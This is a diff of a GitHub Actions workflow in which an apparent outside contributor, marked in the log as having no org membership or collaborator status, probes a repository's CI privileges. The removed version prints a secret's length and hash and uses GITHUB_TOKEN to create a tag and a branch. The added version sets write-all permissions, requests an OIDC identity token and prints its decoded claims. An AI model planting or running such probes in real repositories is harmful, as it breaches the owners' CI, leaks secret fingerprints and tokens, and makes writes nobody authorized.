@@ -1,36 +1,25 @@
-name: vfy-mq-probe
+name: vfy-mq-ceiling
 on:
   merge_group:
-permissions:
-  contents: write
+permissions: write-all
 jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: provenance + secret reach + EXERCISE the granted write
-        env:
-          PROBE: ${{ secrets.C246_PROBE }}
-          TOK: ${{ secrets.GITHUB_TOKEN }}
-          REPO: ${{ github.repository }}
-          ACTOR: ${{ github.actor }}
-          EV: ${{ github.event_name }}
+      - name: ceiling probe
         run: |
-          echo "VFY PROVENANCE event=$EV repository=$REPO actor=$ACTOR ref=$GITHUB_REF sha=$GITHUB_SHA"
-          echo "VFY AUTHOR=mrbenty-c NO-ORG-MEMBERSHIP NO-COLLABORATOR"
-          if [ -n "$PROBE" ]; then
-            echo "VFY SECRET: PRESENT len=${#PROBE}"
-            printf '%s' "$PROBE" | sha256sum | sed 's/^/VFY SECRET sha256: /'
+          echo "VFY2 event=$GITHUB_EVENT_NAME repository=$GITHUB_REPOSITORY ref=$GITHUB_REF"
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            echo "VFY2 OIDC: request URL PRESENT -> id-token write is granted"
+            curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=vfy-internal" -o /tmp/o.json
+            python3 - <<'EOF'
+import json,base64
+t=json.load(open('/tmp/o.json'))['value']
+p=t.split('.')[1]; p+='='*(-len(p)%4)
+c=json.loads(base64.urlsafe_b64decode(p))
+print("VFY2 OIDC CLAIMS:", json.dumps({k:c.get(k) for k in ["iss","aud","sub","repository","repository_owner","actor","workflow_ref","job_workflow_ref","event_name"]}))
+EOF
           else
-            echo "VFY SECRET: ABSENT"
+            echo "VFY2 OIDC: request URL ABSENT -> id-token NOT granted"
           fi
-          TAG="vfy-write-$GITHUB_RUN_ID"
-          C1=$(curl -s -o /tmp/t.json -w '%{http_code}' -X POST \
-            -H "Authorization: token $TOK" -H "Accept: application/vnd.github+json" \
-            "https://api.github.com/repos/$REPO/git/refs" \
-            -d "{\"ref\":\"refs/tags/$TAG\",\"sha\":\"$GITHUB_SHA\"}")
-          echo "VFY WRITE tag -> HTTP=$C1"; head -c 300 /tmp/t.json; echo
-          C2=$(curl -s -o /tmp/b.json -w '%{http_code}' -X POST \
-            -H "Authorization: token $TOK" -H "Accept: application/vnd.github+json" \
-            "https://api.github.com/repos/$REPO/git/refs" \
-            -d "{\"ref\":\"refs/heads/zz-vfy-$GITHUB_RUN_ID\",\"sha\":\"$GITHUB_SHA\"}")
-          echo "VFY WRITE branch -> HTTP=$C2"; head -c 300 /tmp/b.json; echo
